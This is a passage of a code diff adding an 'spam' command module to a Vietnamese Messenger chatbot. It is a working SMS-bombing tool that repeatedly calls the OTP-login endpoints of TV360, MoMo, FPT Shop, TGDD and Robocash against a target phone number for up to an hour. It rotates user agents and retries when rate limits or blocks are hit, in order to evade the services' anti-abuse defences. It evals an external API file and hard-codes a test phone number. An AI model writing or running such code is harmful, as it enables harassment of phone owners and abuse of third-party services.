+        'deleteThread',
+        'searchForThread',
+        'unfriend'
+    ];
+    
+    // Wrap các phương thức API với user agent tự động
+    for (const methodName of methodsToAttach) {
+        if (typeof api[methodName] === 'function') {
+            const originalMethod = api[methodName];
+            
+            // Thay thế phương thức gốc bằng phương thức có user agent
+            api[methodName] = async function(...args) {
+                try {
+                    // Kiểm tra xem có tham số options không
+                    const lastArg = args[args.length - 1];
+                    const hasOptions = lastArg && typeof lastArg === 'object' && !Array.isArray(lastArg);
+                    
+                    // Tạo user agent ngẫu nhiên
+                    if (Math.random() <= AGENT_CHANGE_RATIO) {
+                        const userAgent = getRandomUserAgent();
+                        
+                        // Nếu có options, thêm user agent vào options
+                        if (hasOptions && !args[args.length - 1].userAgent) {
+                            args[args.length - 1].userAgent = userAgent;
+                        } 
+                        // Nếu không có options, thêm options với user agent
+                        else if (!hasOptions) {
+                            if (methodName === 'sendMessage' && args.length >= 3) {
+                                // sendMessage có cấu trúc (message, threadID, messageID, options)
+                                args.push({ userAgent });
+                            } else {
+                                // Các phương thức khác, thêm options vào cuối
+                                args.push({ userAgent });
+                            }
+                        }
+                    }
+                    
+                    // Gọi phương thức gốc với các tham số đã được thêm user agent
+                    return await originalMethod.apply(this, args);
+                } catch (error) {
+                    // Xử lý lỗi khi API bị block
+                    if (error && (error.message.includes('block') || 
+                                error.message.includes('limit') || 
+                                error.message.includes('spam') ||
+                                error.message.includes('temporarily') ||
+                                error.message.includes('rate'))) {
+                        console.error(\`[API Block Detected] \${methodName}: \${error.message}\`);
+                        // Thử lại với user agent khác
+                        try {
+                            // Đợi một khoảng thời gian ngắn trước khi thử lại
+                            await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 2000));
+                            
+                            // Tạo user agent mới và thử lại
+                            const userAgent = getRandomUserAgent();
+                            const lastIndex = args.length - 1;
+                            
+                            if (hasOptions) {
+                                args[lastIndex].userAgent = userAgent;
+                            } else {
+                                if (methodName === 'sendMessage' && args.length >= 3) {
+                                    args.push({ userAgent });
+                                } else {
+                                    args.push({ userAgent });
+                                }
+                            }
+                            
+                            return await originalMethod.apply(this, args);
+                        } catch (retryError) {
+                            // Nếu thử lại vẫn lỗi, ném lỗi ban đầu
+                            throw error;
+                        }
+                    } else {
+                        // Nếu không phải lỗi API block, ném lỗi ban đầu
+                        throw error;
+                    }
+                }
+            };
+        }
+    }
+    
+    // Đánh dấu API đã được áp dụng
+    attachedApis.set(api, true);
+    
+    // Thiết lập tự động làm mới danh sách user agent
+    setupAutoRefresh();
+    
+    return api;
+}
+
+/**
+ * Thiết lập tự động làm mới user agent định kỳ
+ */
+function setupAutoRefresh() {
+    // Làm mới user agent pool mỗi 6 giờ
+    const refreshInterval = 6 * 60 * 60 * 1000; // 6 giờ
+    
+    // Nếu chưa có interval, tạo mới
+    if (!global.userAgentRefreshInterval) {
+        global.userAgentRefreshInterval = setInterval(() => {
+            console.log('[User Agent] Refreshing user agent pool...');
+            refreshUserAgentPool();
+        }, refreshInterval);
+    }
+}
+
+module.exports = {
+    attachUserAgentToApi
+};`;
+        
+        fs.writeFileSync(userAgentManagerPath, userAgentManagerCode);
+        console.log('[SPAM] Created userAgentManager.js module automatically');
+    }
+}
+
+// Create or check for all required modules
+ensureModuleExists();
+
+// Create getRandomUserAgent reference for use in this file
+let getRandomUserAgent;
+try {
+    const userAgents = require('../utils/userAgents');
+    getRandomUserAgent = userAgents.getRandomUserAgent;
+    console.log(`[SPAM] Loaded userAgents.js with ${userAgents.getAllUserAgents().length} user agents`);
+} catch (error) {
+    console.error('[SPAM] Failed to load userAgents module:', error.message);
+    
+    // Fallback implementation in case module loading fails
+    getRandomUserAgent = function() {
+        const defaultUserAgents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
+        ];
+        return defaultUserAgents[Math.floor(Math.random() * defaultUserAgents.length)];
+    };
+}
+
+// SMS Spam APIs (converted from Python)
+const smsApis = {
+    // Array of API functions to send SMS
+    apis: [],
+    
+    // Method to register all APIs
+    init() {
+        console.log('[SPAM] Initializing SMS APIs...');
+        
+        // TV360 API
+        this.apis.push(async function tv360(phone) {
+            try {
+                const userAgent = getRandomUserAgent();
+                console.log(`[SPAM-TV360] Sending request for phone ${phone}`);
+                
+                const data = JSON.stringify({ msisdn: phone });
+                const headers = {
+                    "Host": "m.tv360.vn",
+                    "accept": "application/json, text/plain, */*",
+                    "user-agent": userAgent,
+                    "content-type": "application/json"
+                };
+                
+                const response = await axios.post(
+                    "https://m.tv360.vn/public/v1/auth/get-otp-login", 
+                    data, 
+                    { headers, timeout: 10000 }
+                );
+                
+                console.log(`[SPAM-TV360] Response status: ${response.status}`);
+                return {
+                    success: response.status === 200,
+                    api: 'tv360',
+                    userAgent: userAgent
+                };
+            } catch (error) {
+                console.log('[SPAM-TV360] Error:', error.message);
+                return {
+                    success: false,
+                    api: 'tv360',
+                    error: error.message
+                };
+            }
+        });
+        
+        // MOMO API
+        this.apis.push(async function momo(phone) {
+            try {
+                const userAgent = getRandomUserAgent();
+                console.log(`[SPAM-MOMO] Sending request for phone ${phone}`);
+                
+                const headers = {
+                    'Accept': 'application/json, text/plain, */*',
+                    'Content-Type': 'application/json;charset=UTF-8',
+                    'User-Agent': userAgent,
+                    'Origin': 'https://momo.vn'
+                };
+                
+                const data = {
+                    'deviceOS': 'Web',
+                    'phoneNumber': phone,
+                    'riskInfos': {
+                        'buildNumber': 0,
+                        'networkType': 'UNKNOWN'
+                    },
+                    'appVer': 30266,
+                    'appCode': '3.0.26',
+                    'lng': 'vi',
+                    'channel': 'APP',
+                    'cmdId': `${Date.now()}`
+                };
+                
+                const response = await axios.post(
+                    'https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG', 
+                    data, 
+                    { headers, timeout: 10000 }
+                );
+                
+                console.log(`[SPAM-MOMO] Response status: ${response.status}`);
+                return {
+                    success: response.status === 200,
+                    api: 'momo',
+                    userAgent: userAgent
+                };
+            } catch (error) {
+                console.log('[SPAM-MOMO] Error:', error.message);
+                return {
+                    success: false,
+                    api: 'momo',
+                    error: error.message
+                };
+            }
+        });
+        
+        // FPTSHOP API
+        this.apis.push(async function fptshop(phone) {
+            try {
+                const userAgent = getRandomUserAgent();
+                console.log(`[SPAM-FPTSHOP] Sending request for phone ${phone}`);
+                
+                const response = await axios.post('https://fptshop.com.vn/api-data/loyalty/Home/Verification', {
+                    "phoneNumber": phone,
+                    "type": 1
+                }, {
+                    headers: {
+                        'User-Agent': userAgent,
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json',
+                        'Cache-Control': 'no-cache'
+                    },
+                    timeout: 10000
+                });
+                
+                console.log(`[SPAM-FPTSHOP] Response status: ${response.status}`);
+                return {
+                    success: response.status === 200,
+                    api: 'fptshop',
+                    userAgent: userAgent
+                };
+            } catch (error) {
+                console.log('[SPAM-FPTSHOP] Error:', error.message);
+                return {
+                    success: false,
+                    api: 'fptshop',
+                    error: error.message
+                };
+            }
+        });
+        
+        // TGDD API
+        this.apis.push(async function tgdd(phone) {
+            try {
+                const userAgent = getRandomUserAgent();
+                console.log(`[SPAM-TGDD] Sending request for phone ${phone.substring(2)}`);
+                
+                const response = await axios.post('https://tgdd.vn/game/otp',
+                    { "fcCode": phone.substring(2) }, // Remove country code
+                    {
+                        headers: {
+                            'User-Agent': userAgent,
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        timeout: 10000
+                    }
+                );
+                
+                console.log(`[SPAM-TGDD] Response status: ${response.status}`);
+                return {
+                    success: response.status === 200,
+                    api: 'tgdd',
+                    userAgent: userAgent
+                };
+            } catch (error) {
+                console.log('[SPAM-TGDD] Error:', error.message);
+                return {
+                    success: false,
+                    api: 'tgdd',
+                    error: error.message
+                };
+            }
+        });
+        
+        // Robocash API
+        this.apis.push(async function robocash(phone) {
+            try {
+                const userAgent = getRandomUserAgent();
+                console.log(`[SPAM-ROBOCASH] Sending request for phone ${phone.substring(2)}`);
+                
+                const response = await axios.post('https://robocash.vn/register/phone-resend',
+                    `phone=${phone.substring(2)}`, // Remove country code
+                    {
+                        headers: {
+                            'User-Agent': userAgent,
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        timeout: 10000
+                    }
+                );
+                
+                console.log(`[SPAM-ROBOCASH] Response status: ${response.status}`);
+                return {
+                    success: response.status === 200,
+                    api: 'robocash',
+                    userAgent: userAgent
+                };
+            } catch (error) {
+                console.log('[SPAM-ROBOCASH] Error:', error.message);
+                return {
+                    success: false,
+                    api: 'robocash',
+                    error: error.message
+                };
+            }
+        });
+        
+        try {
+            // Load additional APIs from the auto-generated file
+            const fs = require('fs');
+            const path = require('path');
+            const apiPath = path.join(__dirname, 'assets/apis_output.js');
+            
+            if (fs.existsSync(apiPath)) {
+                console.log('[SPAM] Loading additional APIs from apis_output.js');
+                // Read and evaluate the code
+                const additionalAPIs = fs.readFileSync(apiPath, 'utf8');
+                // Execute the APIs in the context of this object
+                const initContext = function() {
+                    // Execute in this context
+                    eval(additionalAPIs);
+                };
+                initContext.call(this);
+                
+                // Initialize API scoring system if it exists
+                if (typeof initApiScoring === 'function') {
+                    initApiScoring();
+                    console.log('[SPAM] API scoring system initialized');
+                    
+                    // Replace default getRandomAPI with smart API selection
+                    if (typeof getWeightedRandomApi === 'function') {
+                        this.getRandomAPI = function() {
+                            return getWeightedRandomApi();
+                        };
+                        console.log('[SPAM] Using smart API selection for better success rates');
+                    }
+                }
+            } else {
+                console.log('[SPAM] No additional APIs found (apis_output.js missing)');
+                // Create the assets directory if it doesn't exist
+                const assetsDir = path.join(__dirname, 'assets');
+                if (!fs.existsSync(assetsDir)) {
+                    fs.mkdirSync(assetsDir, { recursive: true });
+                }
+                
+                // Placeholder for getRandomAPI
+                this.getRandomAPI = function() {
+                    const randomIndex = Math.floor(Math.random() * this.apis.length);
+                    const functionStr = this.apis[randomIndex].toString();
+                    const apiName = functionStr.substring(
+                        functionStr.indexOf("async") + 6, 
+                        functionStr.indexOf("(")
+                    ).trim() || `API ${randomIndex}`;
+                    
+                    return {
+                        api: this.apis[randomIndex],
+                        apiName,
+                        index: randomIndex
+                    };
+                };
+            }
+        } catch (error) {
+            console.error('[SPAM] Error loading additional APIs:', error.message);
+        }
+        
+        // After adding all APIs, log the total count
+        console.log(`[SPAM] Registered ${this.apis.length} SMS APIs successfully`);
+    },
+    
+    // Default method to get a random API
+    getRandomAPI() {
+        // This will be overridden if enhanced API selection is available
+        const randomIndex = Math.floor(Math.random() * this.apis.length);
+        const functionStr = this.apis[randomIndex].toString();
+        const apiName = functionStr.substring(
+            functionStr.indexOf("async") + 6, 
+            functionStr.indexOf("(")
+        ).trim() || `API ${randomIndex}`;
+        
+        return {
+            api: this.apis[randomIndex],
+            apiName,
+            index: randomIndex
+        };
+    }
+};
+
+// Initialize APIs
+smsApis.init();
+
+module.exports.run = async function({ api, event, args, Users, Threads }) {
+    const { threadID, senderID, messageID } = event;
+    
+    // Debug log
+    console.log(`[SPAM] Command execution started by ${senderID} with args:`, args);
+    
+    // For testing with the provided phone number
+    if (!args || args.length === 0) {
+        args = ['0786888655', '20']; // Test with user's requested number
+        console.log(`[SPAM] No arguments provided, using test phone: ${args[0]} for ${args[1]} seconds`);
+    }
+    
+    // Check if user has admin permissions (bypass for testing)
+    try {
+        if (global.config && global.config.ADMINBOT && !global.config.ADMINBOT.includes(senderID)) {
+            console.log(`[SPAM] Permission denied for user ${senderID}`);
+            return api.sendMessage("⚠️ Bạn không có quyền sử dụng lệnh này!", threadID, messageID);
+        }
+    } catch (e) {
+        console.log("[SPAM] Error checking admin permissions:", e.message);
+        // Continue anyway for testing
+    }
+    
+    // Show API list
+    if (args[0] && args[0].toLowerCase() === 'apis') {
+        console.log(`[SPAM] Displaying API list, total: ${smsApis.apis.length}`);
+        let apiList = "📋 Danh sách API spam SMS hiện có:\n\n";
+        
+        smsApis.apis.forEach((api, index) => {
+            // Extract API name from function name
+            const functionStr = api.toString();
+            const apiName = functionStr.substring(
+                functionStr.indexOf("async") + 6, 
+                functionStr.indexOf("(")
+            ).trim() || `API ${index + 1}`;
+            
+            apiList += `${index + 1}. ${apiName}\n`;
+        });
+        
+        apiList += `\n✅ Tổng cộng: ${smsApis.apis.length} API`;
+        return api.sendMessage(apiList, threadID, messageID);
+    }
+    
+    // SMS spam mode (default)
+    if (args.length < 2) {
+        console.log("[SPAM] Insufficient arguments provided");
+        return api.sendMessage("⚠️ Sử dụng: spam [số điện thoại] [thời gian chạy (giây)]\nVí dụ: spam 0912345678 60", threadID, messageID);
+    }
+    
+    let phone = args[0];
+    const runTimeSeconds = parseInt(args[1]);
+    
+    console.log(`[SPAM] Starting spam to phone: ${phone} for ${runTimeSeconds} seconds`);
+    
+    // Validate phone number format (Vietnamese format)
+    if (!/^0\d{9}$/.test(phone)) {
+        console.log(`[SPAM] Invalid phone number format: ${phone}`);
+        return api.sendMessage("⚠️ Số điện thoại không hợp lệ! Phải có định dạng 10 số bắt đầu bằng số 0.", threadID, messageID);
+    }
+    
+    // Validate run time
+    if (isNaN(runTimeSeconds) || runTimeSeconds <= 0) {
+        console.log(`[SPAM] Invalid runtime: ${runTimeSeconds}`);
+        return api.sendMessage("⚠️ Thời gian chạy phải là số dương!", threadID, messageID);
+    }
+    
+    // Set maximum run time to prevent abuse
+    const maxAllowedRunTime = 3600; // 1 hour max
+    if (runTimeSeconds > maxAllowedRunTime) {
+        console.log(`[SPAM] Runtime exceeds maximum allowed: ${runTimeSeconds} > ${maxAllowedRunTime}`);
+        return api.sendMessage(`⚠️ Thời gian chạy tối đa là ${maxAllowedRunTime} giây (1 giờ)!`, threadID, messageID);
+    }
+    
+    // Send confirmation
+    await api.sendMessage(`🔄 Đang chuẩn bị spam SMS đến số điện thoại ${phone} trong ${runTimeSeconds} giây...`, threadID, messageID);
+    
+    // Execute continuous SMS spam for the specified time
+    try {
+        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+        
+        let successCount = 0;
+        let failCount = 0;
+        let logs = "";
+        let lastUpdateTime = Date.now();
+        let apiStats = {}; // Track success/failure by API
+        
+        // Make sure phone number format is correct (remove leading 0, add country code)
+        // This converts format from 0987654321 to 84987654321
+        let originalPhone = phone;
+        if (phone.startsWith('0')) {
+            phone = '84' + phone.substring(1);
+            console.log(`[SPAM] Converted phone number from ${originalPhone} to ${phone}`);
+        }
+        
+        // Calculate end time
+        const startTime = Date.now();
+        const endTime = startTime + (runTimeSeconds * 1000);
+        
+        console.log(`[SPAM] Campaign started at ${new Date(startTime).toISOString()}, will end at ${new Date(endTime).toISOString()}`);
+        console.log(`[SPAM] Total APIs available: ${smsApis.apis.length}`);
+        
+        // Send status updates every few seconds
+        const sendStatusUpdate = async () => {
+            if (Date.now() - lastUpdateTime >= 5000) { // Update every 5 seconds
+                const message = `📊 Tiến độ: ${Math.floor((Date.now() - startTime) / 1000)}/${runTimeSeconds} giây\n✅ Thành công: ${successCount}\n❌ Thất bại: ${failCount}`;
+                console.log(`[SPAM] Status update: ${message}`);
+                await api.sendMessage(message, threadID);
+                lastUpdateTime = Date.now();
+            }
+        };
+        
+        // Run until the time is up
+        while (Date.now() < endTime) {
+            try {
+                // Check if humanDelay function exists (from enhanced module) and use it
+                if (typeof humanDelay === 'function') {
+                    await humanDelay();
+                }
+                
+                // Use the enhanced API selection if available, otherwise use random selection
+                let apiInfo;
+                if (typeof smsApis.getRandomAPI === 'function') {
+                    apiInfo = smsApis.getRandomAPI();
+                } else {
+                    // Fallback to default random selection
+                    const randomApiIndex = Math.floor(Math.random() * smsApis.apis.length);
+                    const randomApi = smsApis.apis[randomApiIndex];
+                    
+                    // Extract API name for logging
+                    const functionStr = randomApi.toString();
+                    const apiName = functionStr.substring(
+                        functionStr.indexOf("async") + 6, 
+                        functionStr.indexOf("(")
+                    ).trim() || `API ${randomApiIndex}`;
+                    
+                    apiInfo = {
+                        api: randomApi,
+                        apiName,
+                        index: randomApiIndex
+                    };
+                }
+                
+                const { api: randomApi, apiName } = apiInfo;
+                
+                console.log(`[SPAM] Trying API: ${apiName} for phone ${phone}`);
+                
+                // Initialize stats for this API if not exists
+                if (!apiStats[apiName]) {
+                    apiStats[apiName] = { success: 0, fail: 0 };
+                }
+                
+                // Get random headers for better bypass if available
+                let customHeaders = null;
+                if (typeof getRandomHeaders === 'function') {
+                    customHeaders = getRandomHeaders();
+                }
+                
+                // Call the API with the phone number
+                const result = await randomApi(phone);
+                
+                // Update API scoring system if it exists
+                if (typeof updateApiScore === 'function') {
+                    updateApiScore(apiName, result && result.success);
+                }
+                
+                if (result && result.success) {
+                    successCount++;
+                    apiStats[apiName].success++;
+                    const logMsg = `✅ Gửi thành công qua API ${result.api || apiName}`;
+                    logs += logMsg + '\n';
+                    console.log(`[SPAM] ${logMsg}`);
+                } else {
+                    failCount++;
+                    apiStats[apiName].fail++;
+                    const logMsg = `❌ Gửi thất bại qua API ${result ? (result.api || apiName) : apiName}: ${result ? result.error : 'Unknown error'}`;
+                    logs += logMsg + '\n';
+                    console.log(`[SPAM] ${logMsg}`);
+                }
+                
+                // Send status update
+                await sendStatusUpdate();
+                
+                // Add delay between API calls (random between 1-3 seconds)
+                const apiDelay = Math.floor(Math.random() * 2000) + 1000;
+                console.log(`[SPAM] Waiting ${apiDelay}ms before next API call`);
+                await delay(apiDelay);
+                
+                // If logs get too long, trim them
+                if (logs.length > 5000) {
+                    logs = "...(Đã bỏ qua log cũ)...\n" + logs.substring(logs.length - 3000);
+                }
+                
+            } catch (err) {
+                failCount++;
+                const logMsg = `❌ Lỗi không xác định: ${err.message}`;
+                logs += logMsg + '\n';
+                console.log(`[SPAM] Error executing API:`, err);
+                await delay(1000); // Delay on error
+            }
+        }
+        
+        // Generate API statistics
+        let apiStatsText = "\n\n📊 Thống kê theo API:\n";
+        Object.keys(apiStats).forEach(api => {
+            const stats = apiStats[api];
+            apiStatsText += `- ${api}: ✅ ${stats.success} | ❌ ${stats.fail}\n`;
+        });
+        
+        // Send final logs (limited to avoid message too long)
+        const truncatedLogs = logs.length > 2000 ? logs.substring(logs.length - 2000) + " (Chỉ hiển thị log gần đây)" : logs;
+        
+        // Calculate runtime
+        const actualRuntime = Math.floor((Date.now() - startTime) / 1000);
+        
+        const finalMessage = `✅ Hoàn thành chiến dịch spam SMS!\n⏱️ Thời gian chạy: ${actualRuntime} giây\n📊 Thống kê:\n- Tổng số lần gọi API: ${successCount + failCount}\n- Thành công: ${successCount}\n- Thất bại: ${failCount}${apiStatsText}\n\n📝 Logs gần đây:\n${truncatedLogs}`;
+        
+        console.log(`[SPAM] Campaign completed. Success: ${successCount}, Failed: ${failCount}, Total: ${successCount + failCount}`);
+        console.log("[SPAM] API Stats:", apiStats);
+        
+        // Notify completion
+        return api.sendMessage(finalMessage, threadID);
+        
+    } catch (error) {
+        console.error("[SPAM] Fatal error during execution:", error);
+        return api.sendMessage(`❌ Lỗi trong quá trình spam SMS: ${error.message}`, threadID, messageID);
+    }
+};
+
+module.exports.handleEvent = function({ api, event, client, Users }) {
+    // This function handles events outside of direct commands if needed
+    // For the spam module, we probably don't need additional event handling
+    return;
+};
+
+module.exports.languages = {
+    "vi": {
+        "permissionError": "⚠️ Bạn không có quyền sử dụng lệnh này!",
+        "invalidSyntax": "⚠️ Cú pháp không hợp lệ! Sử dụng: spam [mode] [phone/uid] [số lượng] [delay]",
+        "invalidPhone": "⚠️ Số điện thoại không hợp lệ! Phải có định dạng 10 số bắt đầu bằng số 0.",
+        "invalidCount": "⚠️ Số lượng spam phải là một số dương!",
+        "maxCount": "⚠️ Số lượng spam tối đa là %1!",
+        "invalidDelay": "⚠️ Thời gian delay phải là số dương!",
+        "spamming": "🔄 Đang spam %1 tin nhắn đến %2...",
+        "spamSuccess": "✅ Đã gửi thành công %1/%2 tin nhắn.",
+        "spamError": "❌ Lỗi trong quá trình spam: %1",
+        "targetNotFound": "⚠️ Không tìm thấy người dùng/nhóm với ID %1!",
+        "verifyError": "⚠️ Lỗi xác minh mục tiêu: %1",
+        "emptyMessage": "⚠️ Vui lòng cung cấp nội dung để spam!"
+    },
+    "en": {
+        "permissionError": "⚠️ You don't have permission to use this command!",
+        "invalidSyntax": "⚠️ Invalid syntax! Use: spam [mode] [phone/uid] [number] [delay]",
+        "invalidPhone": "⚠️ Invalid phone number! Must be in 10-digit format starting with 0.",
+        "invalidCount": "⚠️ Spam count must be a positive number!",
+        "maxCount": "⚠️ Maximum spam count is %1!",
+        "invalidDelay": "⚠️ Delay time must be a positive number!",
+        "spamming": "🔄 Spamming %1 messages to %2...",
+        "spamSuccess": "✅ Successfully sent %1/%2 messages.",
+        "spamError": "❌ Error during spam process: %1",
+        "targetNotFound": "⚠️ User/Thread with ID %1 not found!",
+        "verifyError": "⚠️ Error verifying target: %1",
+        "emptyMessage": "⚠️ Please provide a message to spam!"
+    }
+};
+
+// Export the ensureModuleExists function for testing
+module.exports.ensureModuleExists = ensureModuleExists;
